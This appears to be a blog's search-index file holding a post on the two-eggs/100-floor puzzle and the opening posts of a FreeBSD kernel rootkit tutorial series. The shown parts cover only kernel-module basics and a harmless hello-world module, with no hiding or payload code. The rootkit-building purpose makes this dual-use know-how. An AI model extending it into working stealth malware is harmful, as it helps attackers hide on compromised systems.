var store = [{
        "title": "2 Eggs versus 100 Floor",
        "excerpt":"I saw this problem posted on Facebook today, and find it really intriguing and quite enjoyable to solve.   The problem is described as follow:           You are given 2 eggs.     You have access to a 100-storey building.     Eggs can be very hard or very fragile means it may break if dropped from the first floor or may not even break if dropped from 100 th floor.Both eggs are identical.     You need to figure out the highest floor of a 100-storey building an egg can be dropped without breaking.     Now the question is how many drops you need to make. You are allowed to break 2 eggs in the process      The following methods, codes, and algorithms are all from a pure computer   student’s point of view, I know some people can directly solve the problem   without writing any code, but that’s no fun, is it?   Understand the question  Let’s take a rough look at the question first. Given that these two eggs are identical, the hardness of these two eggs are equally the same, which means that   hardness(egg1) = hardness(egg2)  highest_breaking_floor(egg1) = highest_breaking_floor(egg2)   I’m quite tempted to use binary search, drop the first egg at 50th floor, we will then have two possible consequences           Egg1 breaks       This means the highest floor the egg doesn’t break is less than 50, or 1-49th.          Egg1 did not break       And this means the highest floor the egg can bear to be dropped down from is greater than 50, 51-100th.    This seems to be a very straight forward solution to find out the answer, either one of these two situations will require a linear search to find out the real answer. This is a general solution to solve the problem, but the performance of total tries are questionable.   The General Solution  In order to better understand how this approach works, let’s look at the following pseudocode and flowchart.   DROP egg1 AT 50th FLOOR  IF egg1.break == TRUE:     FOR answer=1, answer&lt;=49,answer++         DROP egg2 AT answer FLOOR         IF egg2.break == TRUE:             PRINT 'The Answer IS:', answer-1             BREAK  ELSE:     FOR answer=51, answer&lt;=100,answer++         DROP egg1 AT answer FLOOR         IF egg1.break == TRUE:             PRINT 'The Answer IS:', answer-1             BREAK      Well, let’s admit it, this is, as the name suggests, a very basic and general solution. But before we try to figure out better algorithms, let’s look at this general solution a little bit closer.   We all know that under most context, a binary search is almost definitely better than a linear search, then why don’t we keep performing it and instead utilized linear search after the first try?   Imagine if we broke the first egg at 50th floor, and wants to continue binary search, then the next floor to try would be 25th floor. Now if the second egg breaks at 25th floor, or any other subsequent binary search tries, there would be no egg left to find out the exact answer.   However if the first egg does not break when dropped from 50th floor, we now still have 2 eggs to spare, which would allow us to perform more binary searches through 51-100th floor until we have only 1 egg left. So in short, we can only perform binary search when we have both eggs intact, and linear search when we have only 1 of them left. Pretty straighforward.   More binary search!   Instead of performing 49 linear search plus the initial binary search, scoring a horrific 50 tries at worst circumstance, let’s find out what is the optimal number of tries if the first egg manages to survive every binary search drops.                  Count       Try At       Binary Search Start Value       Binary Search End Value       Number of Search Values                       1       50       51       100       50                 2       75       76       100       25                 3       88       87       100       13                 4       94       93       100       7                 5       97       96       100       4                 6       99       98       100       2           The table above illustrates a typical binary search, we always halve the Number of Search Values and add it to the last Try At to get the next binary search offset.   It is clear that the minimal number of tries to get the answer would be 6, we drop the egg at 99th floor if it manages to survive all previous attempts, the answer is 98 if it breaks, and 100 if it doesn’t.   Now we know the range of tries to find the answer is 6 to 50, it is time to optimize our approach.   Optimization   Every optimization starts with a question, are there room for optimization? Fortunately, answering this question often brings us right to the optimized solution, if there is one.   Let’s assume the optimized maximum number of tries to solve this problew is X. We already know that the worst scenario only happen when first binary search resulted in a broken egg, in that case, we have to linear search from 1 to X-1, totalling X-1-1+1 linear searches and 1 already performed binary search.   This means X is not only the max number of tries, but also the first binary search index, or offset if you will. Let’s illustrate this with a table.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 ???       X+1       ???-1       (???-1)-(X+1)+1 = X-2       2       X-2+2 = X           It is obvious for the first try, since at this point we only care about maximum tries, the scenario would be we drop the first egg at Xth floor, it breaks, we then perform linear search from 1st floor to X-1th floor, resulting (X-1)-1+1 = X-1 linear searches, adding the first binary seach try we performed to it, we get X-1+1 = X tries.   Perfect, it meets our assumption that the maximum tries needed to figure out the answer is X. But at which floor should us perform the second binary search try if the egg survived?   Well, we can’t halve the number of remaining search values like we did previously, that simply breaks our assumption of getting the answer within X tries.   An easier way to understand it is, let’s assume the second binary search offset is ???, the linear start would be X+1 since all previous values are ruled out given the first egg survived, the linear end would be ???-1, then total number of linear searches needed to perform if the egg broke at the secound try would be (???-1)-(X+1)+1, and that value must equal to X-2 since only then would total tries equal to X. Thus,      (???-1)-(X+1)+1 = X-2     ??? = 2X-1    Subsequential offsets can all be calculated similarly.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 2X-1       X+1       (2X-1)-1       (2X-1-1)-(X+1)+1 = X-2       2       X-2+2 = X                 3X-3       (2X-1)+1 = 2X       (3X-3)-1       (3X-3-1)-2X = X-3       3       X-3+3 = X                 …       …       …       …       …       …                                                                     It is now obvious that the second binary search offset is X+(X-1) and the third X+(X-1)+(X-2), which allows us to deduce the last try at should be X+(X-1)+(X-2)+…+[X-(X-2)]+1.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 X+(X-1)       X+1       (2X-1)-1       (2X-1-1)-(X+1)+1 = X-2       2       X-2+2 = X                 X+(X-1)+(X-2)       (2X-1)+1 = 2X       (3X-3)-1       (3X-3-1)-2X = X-3       3       X-3+3 = X                 …       …       …       …       …       …                 X+(X-1)+(X-2)+…+[X-(X-2)]+1       N/A       N/A       0       X       X           The last binary search we perform should not require any further linear search, thus resulting in X total binary searches, and consequentially X total tries.   In order to fulfil the assumption that the last offset should require no further linear search, which in other words, means we should cover all floors with the last binary search offset, we can conclude that      X+(X-1)+(X-2)+…+[X-(X-2)]+1 &gt;= 100.     Equally     (X+1)X/2 &gt;= 100     X = 14    Sample Code   #!/usr/bin/python ####Dummy Optimized General Solution for 2 Eggs VS 100th Floor###  import random  total_floor = 100 total_egg = 2 total_try = 14 count_try = 0  max_floor = random.randint(1, 100)  def main():      print '---===2 Eggs VS 100th Floor===---'      print '+Type 'exit' to quit the program!'     start = raw_input('+Start? [Press Enter]')     if start == 'exit':         exit()      last_try_at = 0      while total_egg == 2:         #Which means we can still use binary search until we break one egg.         try_at = last_try_at + total_try - count_try          print '-&gt;[Debug]&lt;!!!-Stage 1-!!!&gt; --&gt; Performing Binary Serach...'         print '-&gt;[Debug]count_try = ', count_try         print '-&gt;[Debug]try_at = ', try_at         print '-&gt;[Debug]last_try_at = ', last_try_at          if drop(try_at):             if try_at == 99:                 #This is the extreme case where the binary search was performed at 99th floor, and                 #it breaks, which means 98 is the answer in this context.                 print '-&gt;[Debug]The asnwer is 98!'                 print '-&gt;[Debug]Total Number of Tries: ', count_try                 exit()             linear_start = last_try_at + 1             linear_end = try_at-1             print '-&gt;[Debug]Egg1 Broke!'             print '-&gt;[Debug]Correct answer is in ', linear_start, 'to', linear_end             print '-&gt;[Debug]&lt;!!!-Stage 2-!!!&gt; --&gt; Performing Linear Search...'             for i in range (linear_start, linear_end+1):                 if drop(i):                     print '-&gt;[Debug]Egg broke at', i                     print '-&gt;[Debug]The answer is', i-1                     print '-&gt;[Debug]Total Number of Tries: ', count_try                     exit()                 else:                     print '-&gt;[Debug]Egg did not break at', i              print '-&gt;[Debug]Egg survived all linear searches.'             print '-&gt;[Debug]The answer is', linear_end             print '-&gt;[Debug]Total Number of Tries: ', count_try              break         else:             if try_at == 99:                 #This is the extreme case where the binary search was performed at 99th floor, and                 #it didn't break, which means 100 is the answer in this context.                 print '-&gt;[Debug]The asnwer is 100!'                 print '-&gt;[Debug]Total Number of Tries: ', count_try                 exit()             last_try_at = try_at             print '-&gt;[Debug]Egg1 did not break at ', try_at             print '-&gt;[Debug]Continue binary search...'             continue          break  def drop(floor):     global total_egg     global count_try      if total_egg &lt;= 0:         print '-&gt;No egg available for testing, program failed!'         exit()     elif floor &gt; max_floor: #Egg is gonna break         total_egg -= 1         print '-&gt;Drop egg at ', floor, 'floor: [Broken!]', total_egg, 'egg left!'         count_try += 1         return 1;     else:         print '-&gt;Drop egg at ', floor, 'floor: [Did not break!]', total_egg, 'egg left!'         count_try += 1         return 0; main()   Run this piece of code, you’ll get the number of total tries at the end of each run. To simulate the one of the worst scenario, simply change max_floor to 13.      EDIT: I find myself extremely lack of mathematical thinking at the time of writing this post. However, it is fun to observe your though process many years ago, plus I did manage to get an answer :-D   ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/the-2-eggs-vs-100-floor-problem/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - Introduction",
        "excerpt":"As the title suggests, this is a howto tutorial on FreeBSD kernel rootkit design. It was prepared as notes as I worked on my college final year project while reading Designing BSD Rootkits: An Introduction to Kernel Hacking, where I got most of the information I needed. I then posted these notes on my blog hoping it could serve as a quick introduction to general kernel hacking. Those notes were filled with unorganized brainstorming and unnecessary technical details that even I myself couldn’t bear reading a page without drinking way too much coffee. It clearly failed it’s purpose.   It took me a year to realize that it’s a shame to give up all that hard work. I rewrote the whole thing to make them more like tutorials other than academic class notes.   I actually wanted to write this howto together with my college final year project synchronously, but sadly things didn’t work out the way I expected. It took me almost a year to reach this point of rewriting most of them to make them more like tutorials other than academic class notes.   Anyway, here I am, writing this intro again, hoping that I can finally finish it this time.   FreeBSD Kernel Rootkit Design and Defense Techniques is the title of my college final year project, I chose this topic because my lecturer who I consulted with thinks this one can help me at applying master degree in malicious software analysis.   I myself have no interest in pursuing master degree in malicious software analysis, but it sure sounds cool to me to create my very own rootkit, especially on my favorite platform, FreeBSD.   I still remember the lecturer asked me why I wanna make it on FreeBSD instead of Linux, well, there are two reasons.      I’m more familiar with FreeBSD than Linux   I don’t see any recent and public accessible rootkit for FreeBSD   Furthermore, there is another secret weapon to make my life even easier, Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong. I highly recommend you guys to grab a copy of this book. It’s good, and it’s the only book on FreeBSD kernel rootkit design as far as I know, so you kinda have no choice here.   There’s another nice book to start with, The Design and Implementation of the FreeBSD Operating System By Marshall Kirk McKusick and George V. Neville-Neil. As the book name suggests, it can give you a detailed understanding of FreeBSD kernel. Get a copy of this book, read the first few chapters to get a rough understanding and use it as a reference book later on when you work on specific modules of the kernel.   What to Expect   Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong is somehow sufficient for lots of people to kickstart their own rootkit, but you have to be familiar with modern system kernels and have some experiences in working in C.   However, I find this book a little bit rushy, what the author did was to drag you through lots of kernel terminologies and then give you lots of code snippets that, I myself at least, couldn’t understand until I read them for multiple times.   The Design and Implementation of the FreeBSD Operating System By Marshall Kirk McKusick and George V. Neville-Neil on the other hand, discusses overall FreeBSD kernel implementation and as well as each major kernel modules in detail, but the only drawback is that it doesn’t talk much about rootkit techniques, it only concentrates on normal kernel development.   So that’s why I wrote this series on FreeBSD Kernel Rootkit Design, it combines what I have learned, and what I think is useful from all those books and online resources. I also improved some of the examples from Joseph Kong’s book, filled in all related information which were omitted by the author.   Consider this as a tutorial series. If you are looking for a quick and comprehensive from novice to advanced novice guide on writing FreeBSD Kernel Rookits, then congratulations, this is just right for you.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-introduction/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module",
        "excerpt":"Needless to say that the first thing you need to start FreeBSD kernel rootkit development is a FreeBSD box. There are plenty of installation guides on the Internet about FreeBSD installation, so that I’ll just skip this part for the sake of simplicity.   And FYI, basically you are free to choose any hardware to run FreeBSD as long as it’s supported. You can even install your FreeBSD as a virtual machine. 5GB hard drive, at least 256MB memory with any modern CPU will do.   The Environment   The version of FreeBSD I’m going to use throughout this howtos is FreeBSD 9 Stable, it is recommended that you install at least FreeBSD 9 Release although I believe code examples in this howtos are able to run on most of versions after FreeBSD 6.2   myBSD# uname -a FreeBSD myBSD 9.0-STABLE FreeBSD 9.0-STABLE #0: Thu Mar  8 14:16:25 CST 2012 bestwc@myBSD:/usr/obj/usr/src/sys/GENERIC  amd64   Package Installation   You’ll need the FreeBSD source tree to compile your kernel rootkit, be sure to install it because it is not included in minimal installation. You can do this by two ways, the first is to enable src distribution option during installation, and the recommended way is to perform the following command after the installation.   myBSD# cp /usr/share/examples/cvsup/stable-supfile /root &amp;&amp; cd /root myBSD# ee stable-supfile ================================= *default host=CHANGE_THIS.FreeBSD.org ###Change this line *default host=cvsup.FreeBSD.org ###To this ================================= myBSD# csup -g -L2 stable-supfile   This will sync the source tree on your local file system to the latest one from remote repository, and this will simply download the latest for you if you don’t already have the source tree. It is recommended to run the cusp command shown above to frequently update your source tree, for this will make sure your are developing rootkit with the newest kernel source code, and potentially make it more compatible with new FreeBSD releases.   To examine if you have the src tree on your local box, type the following command:   myBSD# ls /usr/src COPYRIGHT       ObsoleteFiles.inc       crypto          lib         share LOCKS           README      etc         libexec         sys MAINTAINERS     UPDATING    games       release         tools Makefile        bin         gnu         rescue          usr.bin Makefile.inc1   cddl        include     sbin            usr.sbin Makefile.mips   contrib     kerberos5   secure   The Dynamic Kernel Linker (KLD)   The Dynamic Kernel Linker (KLD) is a facility in FreeBSD that allows users to interact with the system kernel by dynamically loading or unloading kernel modules. It may sounds strange to you, but believe it or not that you have utilized KLD multiple times during daily operations on your FreeBSD box. The KLD gets called every time you plug in or plug out a device, or by manually typing kldload or kldunload commands. It is especially useful to device driver developers as they can dynamically load their drivers as kernel module and test the functionalities on the fly without rebooting the system. For more information on the KLD, please refer to the FreeBSD Handbook.   The KLD provides a high way for us to put our code into the running kernel space without recompiling as long as we have the required privilege. So that, if we have our kernel rootkit compiled as loadable kernel module, then we’ll theoretically be able to load that module in any FreeBSD machines on the fly.   Although the KLD interface is not the only way for people to interact with kernel, but is undoubtedly the easiest and probably the fastest way to do that. The only question is, will there be any compatibility issues if we stick to KLD interface?      In FreeBSD 3.0, substantial changes were made to the kernel module subsystem, and the LKM Facility was renamed the Dynamic Kernel Linker (KLD) Facility. Subsequently, the term KLD is commonly used to describe LKMs under FreeBSD.    According to the quote above from Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong, the KLD interface hasn’t been changed since FreeBSD 3.0, which means our yet-to-be-done rootkit should be able to run on any (not always true) modern FreeBSD systems without any (not always true as well) modification.   Just in case that you haven’t realized, we are going to use KLD interfaces a lot in this tutorial. Now let’s get to know the KLD interface more.   The Module Event Handler   When you load or unload any kernel modules to or from the current running kernel, the KLD interface will perform some pre-defined routines to prepare the system. This is called the Module Event Handler, it should be present in every(!) kernel module to handle the initialization and shutdown processes. This handler gets called every time when the code enters or exits kernel space.   (!) Just keep in mind that this isn’t always true, as what the quote says below from Designing BSD Rootkits: An Introduction to Kernel Hacking      Actually, this isn’t entirely true. You can have a KLD that just includes a sysctl. You can also dispense with module handlers if you wish and just use SYSINIT and SYSUNINIT directly to register functions to be invoked on load and unload, respectively. You can’t, however, indicate failure in those.    The prototype of the module event handler is defined in sys/module.h and it is called modeventhand_t   FILE:/usr/src/sys/sys/module.h  myBSD# cat /usr/src/sys/sys/module.h | grep modeventhand_t typedef int (*modeventhand_t)(module_t, int /* modeventtype_t */, void *);   And module_t is a pointer to the module’s struct as defined in the same file.   FILE:/usr/src/sys/sys/module.h  typedef struct module *module_t;   The modeventtype_t on the other hand is an enumerated type of event types defined in the same file as well.   FILE:/usr/src/sys/sys/module.h  typedef enum modeventtype {         MOD_LOAD,    /* Set when module is loaded. */         MOD_UNLOAD,    /* Set when module is unloaded. */         MOD_SHUTDOWN,    /* Set on shutdown. */         MOD_QUIESCE    /* Set on quiesce. */ } modeventtype_t;   With all these information, we can now try to define a simple module event handler. Here is a simple event handler function called load, which displays Hello, world! when it’s loaded, and print Good-bye, cruel world! when it’s unloaded.   static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd) {     case MOD_LOAD:         uprintf(\"Hello, world!\\n\");         break;      case MOD_UNLOAD:         uprintf(\"Good-bye, cruel world!\\n\");         break;      default:         error = EOPNOTSUPP; //EOPNOTSUPP stands for Error: Operation not supported.         break;     }      return(error); }   It’s perfectly safe if this code doesn’t make much sense to you, as we will get back later. However, what you do need to understand is the prototype of defining a module event handler.   This code snippet should present in your first loadable kernel module, and perform pre-defined routines according to the cmd sent by the kernel accordingly.   Consider this to be a protocol between your module and the kernel, which basically says “Oh the user asked you to unload me? Hold on and let me check my event handler, alright, I’ll print Good-bye, cruel world! and then go away.”   The DECLARE_MODULE Macro   It’s time to get back to our module declaration.   We now know module_t is a pointer to the module structure, but what on earth is a module and how do we define it? The thing is, we must let KLD know the basic information about our module, and it should register itself with kernel when it loads. This process can be awfully long and complicated, lucky that we have a pre-defined macro in sys/module.h that just does this to help us.   FILE:/usr/src/sys/sys/module.h #define DECLARE_MODULE_WITH_MAXVER(name, data, sub, order, maxver) #define DECLARE_MODULE(name, data, sub, order)  * The module declared with DECLARE_MODULE_TIED can only be loaded #define DECLARE_MODULE_TIED(name, data, sub, order)   As shown above, there are actually tree macros for us to declare a module, DECLARE_MODULE, DECLARE_MODULE_TIED, and DECLARE_MODULE_WITH_MAXVER.      DECLARE_MODULE            The simplest one that requires only four parameters to be passed, for normal purposes           DECLARE_MODULE_TIED            Use this macro when your kernel module can only be loaded into the kernel with exactly the same FreeBSD_version           DECLARE_MODULE_WITH_MAXVER            To declare kernel modules that can only run on machines with FreeBSD version maxver or lower           We’ll stick with the general DECLARE_MODULE macro, and now let’s discuss it’s four parameters: name, data, sub, and order.   name      This specifies the generic module name, which is passed as a character string.    data      This parameter specifies the official module name and event handler function, which is passed as a moduledata structure.    The moduledata structure is defined in sys/module.h   FILE:/usr/src/sys/sys/module.h typedef struct moduledata {         const char      *name;          /* module name */         modeventhand_t  evhand;         /* event handler */         void            *priv;          /* extra data */ } moduledata_t;   sub      This specifies the system startup interface namely sysinit_sui_id, which identifies the module type.    We can find a complete list of sysinit_sub_id from sys/kernel.h   FILE:/usr/src/sys/sys/kernel.h enum sysinit_sub_id {         SI_SUB_DUMMY            = 0x0000000,    /* not executed; for linker*/         SI_SUB_DONE             = 0x0000001,    /* processed*/         SI_SUB_TUNABLES         = 0x0700000,    /* establish tunable values */         SI_SUB_COPYRIGHT        = 0x0800001,    /* first use of console*/         SI_SUB_SETTINGS         = 0x0880000,    /* check and recheck settings */         SI_SUB_MTX_POOL_STATIC  = 0x0900000,    /* static mutex pool */         SI_SUB_LOCKMGR          = 0x0980000,    /* lockmgr locks */         SI_SUB_VM               = 0x1000000,    /* virtual memory system init*/         SI_SUB_KMEM             = 0x1800000,    /* kernel memory*/         SI_SUB_KVM_RSRC         = 0x1A00000,    /* kvm operational limits*/         SI_SUB_WITNESS          = 0x1A80000,    /* witness initialization */         SI_SUB_MTX_POOL_DYNAMIC = 0x1AC0000,    /* dynamic mutex pool */         SI_SUB_LOCK             = 0x1B00000,    /* various locks */         SI_SUB_EVENTHANDLER     = 0x1C00000,    /* eventhandler init */         SI_SUB_VNET_PRELINK     = 0x1E00000,    /* vnet init before modules */         SI_SUB_KLD              = 0x2000000,    /* KLD and module setup */         SI_SUB_CPU              = 0x2100000,    /* CPU resource(s)*/         SI_SUB_RACCT            = 0x2110000,    /* resource accounting */         SI_SUB_RANDOM           = 0x2120000,    /* random number generator */         SI_SUB_KDTRACE          = 0x2140000,    /* Kernel dtrace hooks */         SI_SUB_MAC              = 0x2180000,    /* TrustedBSD MAC subsystem */         SI_SUB_MAC_POLICY       = 0x21C0000,    /* TrustedBSD MAC policies */         SI_SUB_MAC_LATE         = 0x21D0000,    /* TrustedBSD MAC subsystem */         SI_SUB_VNET             = 0x21E0000,    /* vnet 0 */         SI_SUB_INTRINSIC        = 0x2200000,    /* proc 0*/         SI_SUB_VM_CONF          = 0x2300000,    /* config VM, set limits*/         SI_SUB_DDB_SERVICES     = 0x2380000,    /* capture, scripting, etc. */         SI_SUB_RUN_QUEUE        = 0x2400000,    /* set up run queue*/         SI_SUB_KTRACE           = 0x2480000,    /* ktrace */         SI_SUB_OPENSOLARIS      = 0x2490000,    /* OpenSolaris compatibility */         SI_SUB_CYCLIC           = 0x24A0000,    /* Cyclic timers */         SI_SUB_AUDIT            = 0x24C0000,    /* audit */         SI_SUB_CREATE_INIT      = 0x2500000,    /* create init process*/         SI_SUB_SCHED_IDLE       = 0x2600000,    /* required idle procs */         SI_SUB_MBUF             = 0x2700000,    /* mbuf subsystem */         SI_SUB_INTR             = 0x2800000,    /* interrupt threads */         SI_SUB_SOFTINTR         = 0x2800001,    /* start soft interrupt thread */         SI_SUB_ACL              = 0x2900000,    /* start for filesystem ACLs */         SI_SUB_DEVFS            = 0x2F00000,    /* devfs ready for devices */         SI_SUB_INIT_IF          = 0x3000000,    /* prep for net interfaces */         SI_SUB_NETGRAPH         = 0x3010000,    /* Let Netgraph initialize */         SI_SUB_DTRACE           = 0x3020000,    /* DTrace subsystem */         SI_SUB_DTRACE_PROVIDER  = 0x3048000,    /* DTrace providers */         SI_SUB_DTRACE_ANON      = 0x308C000,    /* DTrace anon enabling */         SI_SUB_DRIVERS          = 0x3100000,    /* Let Drivers initialize */         SI_SUB_CONFIGURE        = 0x3800000,    /* Configure devices */         SI_SUB_VFS              = 0x4000000,    /* virtual filesystem*/         SI_SUB_CLOCKS           = 0x4800000,    /* real time and stat clocks*/         SI_SUB_CLIST            = 0x5800000,    /* clists*/         SI_SUB_SYSV_SHM         = 0x6400000,    /* System V shared memory*/         SI_SUB_SYSV_SEM         = 0x6800000,    /* System V semaphores*/         SI_SUB_SYSV_MSG         = 0x6C00000,    /* System V message queues*/         SI_SUB_P1003_1B         = 0x6E00000,    /* P1003.1B realtime */         SI_SUB_PSEUDO           = 0x7000000,    /* pseudo devices*/         SI_SUB_EXEC             = 0x7400000,    /* execve() handlers */         SI_SUB_PROTO_BEGIN      = 0x8000000,    /* XXX: set splimp (kludge)*/         SI_SUB_PROTO_IF         = 0x8400000,    /* interfaces*/         SI_SUB_PROTO_DOMAININIT = 0x8600000,    /* domain registration system */         SI_SUB_PROTO_DOMAIN     = 0x8800000,    /* domains (address families?)*/         SI_SUB_PROTO_IFATTACHDOMAIN     = 0x8800001,    /* domain dependent data init*/         SI_SUB_PROTO_END        = 0x8ffffff,    /* XXX: set splx (kludge)*/         SI_SUB_KPROF            = 0x9000000,    /* kernel profiling*/         SI_SUB_KICK_SCHEDULER   = 0xa000000,    /* start the timeout events*/         SI_SUB_INT_CONFIG_HOOKS = 0xa800000,    /* Interrupts enabled config */         SI_SUB_ROOT_CONF        = 0xb000000,    /* Find root devices */         SI_SUB_DUMP_CONF        = 0xb200000,    /* Find dump devices */         SI_SUB_RAID             = 0xb380000,    /* Configure GEOM classes */         SI_SUB_SWAP             = 0xc000000,    /* swap */         SI_SUB_INTRINSIC_POST   = 0xd000000,    /* proc 0 cleanup*/         SI_SUB_SYSCALLS         = 0xd800000,    /* register system calls */         SI_SUB_VNET_DONE        = 0xdc00000,    /* vnet registration complete */         SI_SUB_KTHREAD_INIT     = 0xe000000,    /* init process*/         SI_SUB_KTHREAD_PAGE     = 0xe400000,    /* pageout daemon*/         SI_SUB_KTHREAD_VM       = 0xe800000,    /* vm daemon*/         SI_SUB_KTHREAD_BUF      = 0xea00000,    /* buffer daemon*/         SI_SUB_KTHREAD_UPDATE   = 0xec00000,    /* update daemon*/         SI_SUB_KTHREAD_IDLE     = 0xee00000,    /* idle procs*/         SI_SUB_SMP              = 0xf000000,    /* start the APs*/         SI_SUB_RACCTD           = 0xf100000,    /* start raccd*/         SI_SUB_RUN_SCHEDULER    = 0xfffffff     /* scheduler*/ };   sysinit_sub_id is a list of pre-defined enumerated constant data to declare kernel modules for different purposes. We’ll use SI_SUB_DRIVERS in our first few examples, and some other useful subs are to be introduced in later chapters.   order      This specifies the KLD’s order of initialization within the subsystem, namely the sysinit_elem_order.    A complete list of sysinit_elem_order can be found in sys/kernel.h   FILE:/usr/src/sys/sys/kernel.h enum sysinit_elem_order {         SI_ORDER_FIRST          = 0x0000000,    /* first*/         SI_ORDER_SECOND         = 0x0000001,    /* second*/         SI_ORDER_THIRD          = 0x0000002,    /* third*/         SI_ORDER_FOURTH         = 0x0000003,    /* fourth*/         SI_ORDER_MIDDLE         = 0x1000000,    /* somewhere in the middle */         SI_ORDER_ANY            = 0xfffffff     /* last*/ };   For the sake of simplicity and to concentrate on our purpose, we’ll stick to SI_ORDER_MIDDLE which declares our kernel module somewhere in the middle of the KLD subsystem. We will discuss the others if we need to.   Summary   We’ve talked lots of concepts and kernel terminology, probably too much for a beginner. So just before we go for example code, let’s try to quickly review what we have discussed first.           KLD is the way how we interact our code with FreeBSD kernel            Every KLD module (At least in our case) needs a module event handler called modeventhand_t and it is defined in sys/module.h                       The prototype of modeventhand_t requires module_t and modeventtype_t                        module_t is a pointer to our yet-to-be-declared module. We use DECLARE_MODULE to declare general kernel modules                        The DECLARE_MODULE is defined in sys/module.h and it requires four parameters: name, data, sub, and order                                   name is the general name for the module                                    data is passed as moduledata consists of the official name of the module and the event handler of the module. It is defined in sys/module.h                                    sub is the identifier of the type of the module. It is listed in sysinit_sub_id enum defined in sys/kernel.h                                    order is the initialization position of the module. It is listed in sysinitelemorder enum defined in sys/kernel.h                                            Finally we need modeventtype_t to complete modeventhand_t prototype                        modeventtype_t is an enum types of events defined in sys/module.h to let the kernel module perform corresponding actions when certain event happens                   Here are two figures for you to get an overall understanding of how this works.         Example Code   So, after all these pains and hair-pulling, we are finally gonna have our first kernel loadable module compiled.   /*  * FILE: /root/rootkit/1.1/first_module.c  * Example 1.1  * The First Kernel Loadable Module  * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt;  /* Define a loader function */ static int module_loader(struct module *module, int cmd, void *arg) {     int error=0;      switch(cmd)     {         case MOD_LOAD:             uprintf(\"Lets Rock the Kernel!\\n\");             break;          case MOD_UNLOAD:             uprintf(\"Time to Leave the Party!\\n\");             break;          default:             error=EOPNOTSUPP; //Operation not supported             break;     }     return (error); }  /* Define a module data structure */ static moduledata_t module_data = {     \"first_mlodule\",    // Module name     module_loader,      // Event Handler     NULL                // Extra Data };  /* Declare the module */ DECLARE_MODULE(first_mlodule, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);   Now there’s just one more thing left before we can compile the code, the makefile. If you are not familiar with the concept of makeifle, please google it and get yourself familiar with its basic syntax, just a little bit by now.   Here’s the content of makefile   KMOD=   first_module SRCS=   first_module.c  .include &lt;bsd.kmod.mk&gt;   Save it as makefile in the same folder with first_module.c   As you can see, we use bsd.kmod.mk macro here to make our life easier, because otherwise we’ll have to link all kernel source files manually.   All we have to do here is to fill in the module name and source file name. With the makefile and the source file with us, we can now go ahead and compile our first kernel module by entering make in the same folder.   myBSD# make Warning: Object directory not changed from original /root/rootkit/1.1 cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c first_module.c ld  -d -warn-common -r -d -o first_module.ko first_module.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk first_module.ko  export_syms | xargs -J% objcopy % first_module.ko objcopy --strip-debug first_module.ko   Looks everything is nice and clean, we now have our first module successfully compiled. Now go ahead and treat yourself a muffin.   Let’s take a look at what we have now.   myBSD# ls @       export_syms first_module.c  first_module.ko first_module.o  machine     makefile    x86   We have several files and linkers added here, but hello.ko is what we really care about. That is the result of all our hard work — the loadable module.   It’s like an executable file, same as the file you get in regular application programing, and yes, it is distributable.   Just before you bite that muffin, let’s have our fun first by loading and unloading it.   myBSD# kldload ./first_module.ko Lets Rock the Kernel! myBSD# kldunload first_module.ko Time to Leave the Party! myBSD#   Sweet huh? All of your hard works have been paid by seeing these silly but pretty words printing on your screen.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-1-kld-first-kernel-loadable-module/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 2 - System Call First Kernel Service Module",
        "excerpt":"So, this is the second tutorial on FreeBSD Kernel Rootkit Design. I hope you have worked through the previous one before you continue, which is obviously a prerequisite.   What we’ve discussed are that KLD is the way we interact with kernel, and how to declare a module by having module name, module data (consists of official name and event handler function), sub, and order. And we agree on the not-completely-true assumption that every kernel module should have an event handler function which deals with event type such as MOD_LOAD, MOD_UNLOAD, and so on. If any of these terms sounds strange to you, I encourage you to go back and review FreeBSD Kernel Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module   The System Call Module   Today we’re gonna talk about the system call module, which is a little bit different compared to the general module we’ve discussed previously.   A general module which we’ve talked about in the last session performs programmed actions only when certain actions take place, such as when it loads, unloads, shutdown, and etc.   A system call module on the other hand, is basically as same as the general KLD module, except that it installs itself as a kernel service request, and then listen to certain signals to perform programmed actions accordingly.   Such functions can be considered as kinda of a bridge between the kernel space and the user space, which enables the ability for its users to send signals to the kernel and make it react accordingly.   What makes this system call module different is that, instead of printing messages every time we load or unload the module, we’re gonna make it print messages every time we send command to it.   Here in this session, we’re gonna talk about the system call module, its structure, its declaration routine, and finally write our first system call module along with a tiny client application to send command to it.   The 